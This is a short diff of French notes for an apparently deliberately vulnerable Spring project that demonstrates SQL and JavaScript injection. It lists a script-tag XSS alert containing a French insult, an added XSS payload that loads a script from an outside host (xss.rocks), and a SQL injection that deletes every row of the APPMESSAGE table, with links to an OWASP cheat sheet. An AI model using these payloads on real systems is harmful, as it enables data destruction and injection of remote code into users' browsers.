@@ -3,6 +3,9 @@ Comment on peut avoir des injections, ici SQL et javascript sur un projet Spring
 
 
 EXPLOIT envoyer <script>alert("Connard")</script>
+https://stackoverflow.com/questions/8683018/jsoup-clean-without-adding-html-entities
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
 
 EXPLOIT envoyer '); DELETE FROM APPMESSAGE; --
 
